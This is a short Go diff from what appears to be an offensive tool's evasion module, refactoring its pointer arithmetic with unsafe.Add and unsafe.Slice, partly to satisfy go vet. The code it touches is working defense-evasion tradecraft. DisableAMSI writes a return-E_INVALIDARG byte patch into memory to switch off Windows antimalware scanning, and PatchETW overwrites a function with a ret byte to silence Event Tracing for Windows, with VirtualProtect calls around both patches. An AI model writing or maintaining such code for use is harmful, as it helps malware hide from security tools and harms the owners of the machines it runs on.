@@ -43,7 +43,7 @@ func (e *EvasionHandler) DisableAMSI() error {
 
 	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
 	for i, b := range patch {
-		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
+		*(*byte)(unsafe.Add(unsafe.Pointer(addr), i)) = b
 	}
 
 	virtualProtect.Call(
@@ -259,7 +259,9 @@ func (e *EvasionHandler) PatchETW() error {
 	)
 
 	if ret != 0 {
-		*(*byte)(unsafe.Pointer(addr)) = 0xC3
+		// Use unsafe.Slice to satisfy go vet
+		slice := unsafe.Slice((*byte)(unsafe.Pointer(addr)), 1)
+		slice[0] = 0xC3
 
 		virtualProtect.Call(
 			addr,
